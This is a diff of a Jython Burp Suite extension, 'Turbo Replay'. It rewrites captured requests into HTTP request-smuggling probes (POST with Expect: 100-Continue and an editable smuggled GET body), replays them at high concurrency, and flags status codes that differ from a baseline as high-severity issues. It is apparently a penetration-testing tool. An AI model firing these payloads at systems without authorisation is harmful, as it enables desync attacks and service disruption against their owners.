@@ -4,15 +4,16 @@
 # collects unique endpoints, mutates requests, and replays them
 # at high concurrency (Turbo Intruder-style).
 
-from burp import IBurpExtender, IProxyListener, ITab
+from burp import IBurpExtender, IProxyListener, ITab, IScanIssue
 from javax.swing import (
     JPanel, JTable, JScrollPane, JButton, JLabel, JTextField,
     JTextArea, BorderFactory, SwingUtilities,
-    ListSelectionModel, BoxLayout, Box
+    ListSelectionModel, BoxLayout, Box, JSplitPane
 )
 from javax.swing.table import AbstractTableModel, DefaultTableCellRenderer
-from java.awt import BorderLayout, FlowLayout, Font, Color, Dimension
+from java.awt import BorderLayout, FlowLayout, Font, Color, Dimension, GridLayout
 from java.lang import Runnable, String, Integer
+from java.net import URL
 from java.util.concurrent import Executors, CountDownLatch
 import threading
 from urlparse import urlparse
@@ -21,8 +22,7 @@ from urlparse import urlparse
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
-SMUGGLE_BODY = "GET /sandboxtest%xx HTTP/1.1\r\nX: x\r\n"
-SMUGGLE_BODY_BYTES = len(SMUGGLE_BODY.encode("ascii"))
+DEFAULT_BODY = "GET /sandboxtest%xx HTTP/1.1\r\nX: x\r\n"
 
 STATUS_PENDING = "Pending"
 STATUS_RUNNING = "Running"
@@ -39,14 +39,12 @@ DEFAULT_THREAD_COUNT = 10
 def normalize_path(raw_url):
     """Return the path portion only, stripped of query/fragment, with
     trailing slash removed (except for root '/')."""
-    # raw_url may be a full URL or just a path
     if raw_url.startswith("http://") or raw_url.startswith("https://"):
         parsed = urlparse(raw_url)
         path = parsed.path
     else:
         path = raw_url.split("?")[0].split("#")[0]
 
-    # Strip trailing slash unless root
     if path != "/" and path.endswith("/"):
         path = path.rstrip("/")
 
@@ -60,27 +58,74 @@ class EndpointEntry(object):
     def __init__(self, path, host, method, replay_count, raw_request, http_service):
         self.path = path
         self.host = host
-        self.method = method            # original HTTP method
+        self.method = method
         self.replay_count = replay_count
         self.status = STATUS_PENDING
-        self.raw_request = raw_request   # byte[] of the original request
+        self.raw_request = raw_request
         self.http_service = http_service
-        self.results = {}                # status_code -> count
+        self.results = {}
         self.error_msg = ""
+        self.baseline_code = None
+        self.baseline_length = None
+
+
+# ---------------------------------------------------------------------------
+# Custom Burp scan issue for flagged anomalies
+# ---------------------------------------------------------------------------
+class TurboReplayIssue(IScanIssue):
+    def __init__(self, http_service, url, http_messages, name, detail, severity):
+        self._http_service = http_service
+        self._url = url
+        self._http_messages = http_messages
+        self._name = name
+        self._detail = detail
+        self._severity = severity
+
+    def getUrl(self):
+        return self._url
+
+    def getIssueName(self):
+        return self._name
+
+    def getIssueType(self):
+        return 0x08000000  # extension-generated
+
+    def getSeverity(self):
+        return self._severity
+
+    def getConfidence(self):
+        return "Certain"
+
+    def getIssueBackground(self):
+        return None
+
+    def getRemediationBackground(self):
+        return None
+
+    def getIssueDetail(self):
+        return self._detail
+
+    def getRemediationDetail(self):
+        return None
+
+    def getHttpMessages(self):
+        return self._http_messages
+
+    def getHttpService(self):
+        return self._http_service
 
 
 # ---------------------------------------------------------------------------
 # Swing table model
 # ---------------------------------------------------------------------------
-COLUMNS = ["Path", "Host", "Original Method", "Replay Count", "Status"]
+COLUMNS = ["Path", "Host", "Original Method", "Replay Count", "Status", "Baseline"]
 
 
 class EndpointTableModel(AbstractTableModel):
     def __init__(self):
-        self.entries = []          # list of EndpointEntry
+        self.entries = []
         self._lock = threading.Lock()
 
-    # --- AbstractTableModel interface ---
     def getRowCount(self):
         return len(self.entries)
 
@@ -104,6 +149,10 @@ class EndpointTableModel(AbstractTableModel):
             return Integer(e.replay_count)
         elif col == 4:
             return e.status
+        elif col == 5:
+            if e.baseline_code is not None:
+                return "%d (%d bytes)" % (e.baseline_code, e.baseline_length)
+            return ""
         return ""
 
     def setValueAt(self, value, row, col):
@@ -118,14 +167,13 @@ class EndpointTableModel(AbstractTableModel):
                 pass
 
     def isCellEditable(self, row, col):
-        return col == 3  # only replay count is editable
+        return col == 3
 
     def getColumnClass(self, col):
         if col == 3:
             return Integer
         return String
 
-    # --- custom helpers ---
     def add_entry(self, entry):
         with self._lock:
             self.entries.append(entry)
@@ -146,24 +194,22 @@ class EndpointTableModel(AbstractTableModel):
 # ---------------------------------------------------------------------------
 # Request builder: mutate an original request
 # ---------------------------------------------------------------------------
-def build_smuggle_request(helpers, raw_request, http_service):
+def build_smuggle_request(helpers, raw_request, http_service, body_str):
     """Take the original raw request bytes and return a new byte[] with:
     - Method changed to POST
     - Expect: 100-Continue header added/replaced
-    - Content-Length set to body length
-    - Body replaced with SMUGGLE_BODY
+    - Content-Length set to match body_str byte length
+    - Body replaced with body_str
     """
+    body_len = len(body_str.encode("ascii"))
     analyzed = helpers.analyzeRequest(http_service, raw_request)
-    headers = list(analyzed.getHeaders())  # first element is request line
+    headers = list(analyzed.getHeaders())
 
-    # --- Fix the request line ---
     request_line = headers[0]
     parts = request_line.split(" ")
-    # Replace method with POST
     parts[0] = "POST"
     headers[0] = " ".join(parts)
 
-    # --- Process remaining headers ---
     new_headers = [headers[0]]
     has_expect = False
     has_cl = False
@@ -173,20 +219,17 @@ def build_smuggle_request(helpers, raw_request, http_service):
             new_headers.append("Expect: 100-Continue")
             has_expect = True
         elif lower.startswith("content-length:"):
-            new_headers.append("Content-Length: %d" % SMUGGLE_BODY_BYTES)
+            new_headers.append("Content-Length: %d" % body_len)
             has_cl = True
-        elif lower.startswith("content-type:"):
-            # Keep content-type if present
-            new_headers.append(h)
         else:
             new_headers.append(h)
 
     if not has_expect:
         new_headers.append("Expect: 100-Continue")
     if not has_cl:
-        new_headers.append("Content-Length: %d" % SMUGGLE_BODY_BYTES)
+        new_headers.append("Content-Length: %d" % body_len)
 
-    body_bytes = helpers.stringToBytes(SMUGGLE_BODY)
+    body_bytes = helpers.stringToBytes(body_str)
     return helpers.buildHttpMessage(new_headers, body_bytes)
 
 
@@ -203,10 +246,12 @@ class ReplayTask(object):
         entry = self.entry
         helpers = self.extender._helpers
         callbacks = self.extender._callbacks
+        body_str = self.extender.get_exploit_body()
+        flag_code = self.extender.get_flag_code()
 
         try:
             modified = build_smuggle_request(
-                helpers, entry.raw_request, entry.http_service
+                helpers, entry.raw_request, entry.http_service, body_str
             )
         except Exception as ex:
             entry.status = STATUS_ERROR
@@ -218,14 +263,48 @@ class ReplayTask(object):
         entry.status = STATUS_RUNNING
         self._update_ui()
 
-        count = entry.replay_count
-        results = {}
+        # --- Send the first request as baseline ---
+        try:
+            baseline_resp = callbacks.makeHttpRequest(
+                entry.http_service, modified
+            )
+            baseline_bytes = baseline_resp.getResponse()
+            if baseline_bytes:
+                analyzed_bl = helpers.analyzeResponse(baseline_bytes)
+                entry.baseline_code = analyzed_bl.getStatusCode()
+                body_offset = analyzed_bl.getBodyOffset()
+                entry.baseline_length = len(baseline_bytes) - body_offset
+            else:
+                entry.baseline_code = 0
+                entry.baseline_length = 0
+        except Exception:
+            entry.baseline_code = -1
+            entry.baseline_length = 0
 
-        # Use a thread pool for concurrent replay
+        self._update_ui()
+        self.extender._log_on_edt(
+            "[BASELINE] %s  |  Status: %s  |  Body length: %d bytes"
+            % (entry.path, entry.baseline_code, entry.baseline_length)
+        )
+
+        # --- Replay remaining requests concurrently ---
+        remaining = entry.replay_count - 1
+        if remaining < 1:
+            entry.results[entry.baseline_code] = 1
+            entry.status = STATUS_COMPLETED
+            self._update_ui()
+            self._log_result()
+            return
+
+        results = {entry.baseline_code: 1}
         thread_count = self.extender.thread_count
         pool = Executors.newFixedThreadPool(thread_count)
-        latch = CountDownLatch(count)
+        latch = CountDownLatch(remaining)
         results_lock = threading.Lock()
+        flagged_responses = []
+
+        baseline_code = entry.baseline_code
+        flag_code_val = flag_code
 
         class SendOne(Runnable):
             def run(self_inner):
@@ -238,16 +317,18 @@ class ReplayTask(object):
                         analyzed_resp = helpers.analyzeResponse(resp_bytes)
                         code = analyzed_resp.getStatusCode()
                     else:
-                        code = 0  # no response
+                        code = 0
                     with results_lock:
                         results[code] = results.get(code, 0) + 1
+                        if flag_code_val is not None and code == flag_code_val and code != baseline_code:
+                            flagged_responses.append(resp)
                 except Exception:
                     with results_lock:
                         results[-1] = results.get(-1, 0) + 1
                 finally:
                     latch.countDown()
 
-        for _ in range(count):
+        for _ in range(remaining):
             pool.submit(SendOne())
 
         latch.await()
@@ -257,6 +338,59 @@ class ReplayTask(object):
         entry.status = STATUS_COMPLETED
         self._update_ui()
         self._log_result()
+
+        # --- Raise Burp issue if flagged code appeared ---
+        if flagged_responses:
+            self._raise_scan_issue(entry, flag_code_val, flagged_responses)
+
+    def _raise_scan_issue(self, entry, flag_code, flagged_responses):
+        helpers = self.extender._helpers
+        callbacks = self.extender._callbacks
+
+        count = entry.results.get(flag_code, 0)
+        protocol = str(entry.http_service.getProtocol())
+        host = str(entry.http_service.getHost())
+        port = entry.http_service.getPort()
+        url = URL(protocol, host, port, entry.path)
+
+        detail = (
+            "<b>Turbo Replay - Anomalous Status Code Detected</b><br><br>"
+            "Endpoint: <b>%s</b><br>"
+            "Baseline response: <b>%d</b><br>"
+            "Flagged status code <b>%d</b> appeared <b>%d</b> time(s) "
+            "out of %d total replays.<br><br>"
+            "This indicates the server responded differently under repeated "
+            "requests with the smuggling payload, which may indicate a "
+            "request smuggling or desync vulnerability.<br><br>"
+            "Status code breakdown: %s"
+            % (
+                entry.path,
+                entry.baseline_code,
+                flag_code,
+                count,
+                entry.replay_count,
+                ", ".join(
+                    "%d: %d" % (c, n)
+                    for c, n in sorted(entry.results.items())
+                ),
+            )
+        )
+
+        issue = TurboReplayIssue(
+            http_service=entry.http_service,
+            url=url,
+            http_messages=flagged_responses,
+            name="Turbo Replay: Anomalous %d on %s" % (flag_code, entry.path),
+            detail=detail,
+            severity="High",
+        )
+        callbacks.addScanIssue(issue)
+
+        self.extender._log_on_edt(
+            "** HIGH SEVERITY ISSUE RAISED ** %s  |  "
+            "Flagged code %d appeared %d time(s) (baseline was %d)"
+            % (entry.path, flag_code, count, entry.baseline_code)
+        )
 
     def _update_ui(self):
         model = self.extender.table_model
@@ -277,30 +411,27 @@ class ReplayTask(object):
             parts.append("%s: %d" % (label, cnt))
             total += cnt
 
-        summary = "[%s] %s  |  Total sent: %d  |  %s" % (
+        summary = "[%s] %s  |  Total sent: %d  |  Baseline: %s  |  %s" % (
             entry.status,
             entry.path,
             total,
+            entry.baseline_code,
             ", ".join(parts) if parts else "N/A",
         )
         if entry.error_msg:
             summary += "  |  " + entry.error_msg
 
-        # Flag anomalies (any non-2xx)
-        anomalies = [
-            (c, n) for c, n in entry.results.items() if c < 200 or c >= 300
-        ]
-        if anomalies:
-            flags = ", ".join("%sx%d" % (c, n) for c, n in anomalies)
-            summary += "  ** ANOMALY: " + flags
+        # Flag any codes that differ from baseline
+        if entry.baseline_code is not None:
+            anomalies = [
+                (c, n) for c, n in entry.results.items()
+                if c != entry.baseline_code
+            ]
+            if anomalies:
+                flags = ", ".join("%sx%d" % (c, n) for c, n in anomalies)
+                summary += "  ** ANOMALY (differs from baseline): " + flags
 
-        extender = self.extender
-
-        class Logger(Runnable):
-            def run(self_inner):
-                extender.log(summary)
-
-        SwingUtilities.invokeLater(Logger())
+        self.extender._log_on_edt(summary)
 
 
 # ---------------------------------------------------------------------------
@@ -308,17 +439,15 @@ class ReplayTask(object):
 # ---------------------------------------------------------------------------
 class BurpExtender(IBurpExtender, IProxyListener, ITab):
 
-    # --- IBurpExtender ---
     def registerExtenderCallbacks(self, callbacks):
         self._callbacks = callbacks
         self._helpers = callbacks.getHelpers()
         callbacks.setExtensionName("Turbo Replay")
 
-        self._seen_paths = {}   # (host, normalized_path) -> True
+        self._seen_paths = {}
         self._seen_lock = threading.Lock()
         self.thread_count = DEFAULT_THREAD_COUNT
 
-        # Build UI on EDT
         self.table_model = EndpointTableModel()
         self._build_ui()
 
@@ -332,6 +461,23 @@ class BurpExtender(IBurpExtender, IProxyListener, ITab):
 
     def getUiComponent(self):
         return self._main_panel
+
+    # --- Helpers for reading UI fields ---
+    def get_exploit_body(self):
+        text = self._body_area.getText()
+        if not text or not text.strip():
+            return DEFAULT_BODY
+        # Convert literal \r\n in the text area to actual CR LF
+        return text.replace("\\r\\n", "\r\n").replace("\\n", "\n")
+
+    def get_flag_code(self):
+        text = self._flag_code_field.getText().strip()
+        if not text:
+            return None
+        try:
+            return int(text)
+        except (ValueError, TypeError):
+            return None
 
     # --- IProxyListener ---
     def processProxyMessage(self, is_request, message):
@@ -357,7 +503,6 @@ class BurpExtender(IBurpExtender, IProxyListener, ITab):
                 return
             self._seen_paths[key] = True
 
-        # Get default replay count from UI field
         try:
             default_count = int(self._default_count_field.getText().strip())
             if default_count < 1:
@@ -400,7 +545,15 @@ class BurpExtender(IBurpExtender, IProxyListener, ITab):
         self._thread_field = JTextField(str(DEFAULT_THREAD_COUNT), 4)
         top.add(self._thread_field)
 
-        top.add(Box.createHorizontalStrut(20))
+        top.add(JLabel("  Flag Code:"))
+        self._flag_code_field = JTextField("", 5)
+        self._flag_code_field.setToolTipText(
+            "Status code to flag as High severity issue (e.g. 400). "
+            "Leave blank to disable."
+        )
+        top.add(self._flag_code_field)
+
+        top.add(Box.createHorizontalStrut(12))
 
         btn_start_all = JButton("Start All", actionPerformed=self._on_start_all)
         top.add(btn_start_all)
@@ -413,20 +566,22 @@ class BurpExtender(IBurpExtender, IProxyListener, ITab):
 
         self._main_panel.add(top, BorderLayout.NORTH)
 
-        # --- Table ---
+        # --- Center: table + body editor side by side above the log ---
+        center = JPanel(BorderLayout(5, 5))
+
+        # Table
         self._table = JTable(self.table_model)
         self._table.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION)
         self._table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)
 
-        # Column widths
         col_model = self._table.getColumnModel()
-        col_model.getColumn(0).setPreferredWidth(300)  # Path
-        col_model.getColumn(1).setPreferredWidth(200)  # Host
-        col_model.getColumn(2).setPreferredWidth(80)   # Method
-        col_model.getColumn(3).setPreferredWidth(90)   # Replay Count
-        col_model.getColumn(4).setPreferredWidth(90)   # Status
+        col_model.getColumn(0).setPreferredWidth(250)  # Path
+        col_model.getColumn(1).setPreferredWidth(180)  # Host
+        col_model.getColumn(2).setPreferredWidth(70)   # Method
+        col_model.getColumn(3).setPreferredWidth(80)   # Replay Count
+        col_model.getColumn(4).setPreferredWidth(80)   # Status
+        col_model.getColumn(5).setPreferredWidth(120)  # Baseline
 
-        # Color status column
         class StatusRenderer(DefaultTableCellRenderer):
             def getTableCellRendererComponent(self_inner, table, value, is_sel, has_focus, row, col):
                 comp = DefaultTableCellRenderer.getTableCellRendererComponent(
@@ -445,9 +600,29 @@ class BurpExtender(IBurpExtender, IProxyListener, ITab):
         col_model.getColumn(4).setCellRenderer(StatusRenderer())
 
         table_scroll = JScrollPane(self._table)
-        table_scroll.setPreferredSize(Dimension(900, 350))
+        table_scroll.setPreferredSize(Dimension(650, 300))
 
-        # --- Log area ---
+        # Exploit body editor
+        body_panel = JPanel(BorderLayout(2, 2))
+        body_panel.setBorder(BorderFactory.createTitledBorder("Exploit Body (editable)"))
+
+        self._body_area = JTextArea(DEFAULT_BODY.replace("\r\n", "\\r\\n"))
+        self._body_area.setFont(Font("Monospaced", Font.PLAIN, 12))
+        self._body_area.setLineWrap(True)
+        self._body_area.setRows(8)
+
+        body_hint = JLabel(
+            "<html><i>Use \\r\\n for CRLF. Content-Length auto-calculated.</i></html>"
+        )
+        body_panel.add(body_hint, BorderLayout.NORTH)
+        body_panel.add(JScrollPane(self._body_area), BorderLayout.CENTER)
+        body_panel.setPreferredSize(Dimension(300, 300))
+
+        # Horizontal split: table | body editor
+        top_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, table_scroll, body_panel)
+        top_split.setResizeWeight(0.7)
+
+        # Log area
         self._log_area = JTextArea()
         self._log_area.setEditable(False)
         self._log_area.setFont(Font("Monospaced", Font.PLAIN, 12))
@@ -455,11 +630,10 @@ class BurpExtender(IBurpExtender, IProxyListener, ITab):
         log_scroll.setPreferredSize(Dimension(900, 200))
         log_scroll.setBorder(BorderFactory.createTitledBorder("Replay Results / Log"))
 
-        # Split the center
-        from javax.swing import JSplitPane
-        split = JSplitPane(JSplitPane.VERTICAL_SPLIT, table_scroll, log_scroll)
-        split.setResizeWeight(0.6)
-        self._main_panel.add(split, BorderLayout.CENTER)
+        # Vertical split: (table+body) / log
+        main_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, top_split, log_scroll)
+        main_split.setResizeWeight(0.6)
+        self._main_panel.add(main_split, BorderLayout.CENTER)
 
     # --- Button handlers ---
     def _read_thread_count(self):
@@ -498,7 +672,15 @@ class BurpExtender(IBurpExtender, IProxyListener, ITab):
         t.daemon = True
         t.start()
 
+    def _log_on_edt(self, msg):
+        log_area = self._log_area
+
+        class Logger(Runnable):
+            def run(self_inner):
+                log_area.append(msg + "\n")
+                log_area.setCaretPosition(log_area.getDocument().getLength())
+
+        SwingUtilities.invokeLater(Logger())
+
     def log(self, msg):
-        self._log_area.append(msg + "\n")
-        # Auto-scroll to bottom
-        self._log_area.setCaretPosition(self._log_area.getDocument().getLength())
+        self._log_on_edt(msg)
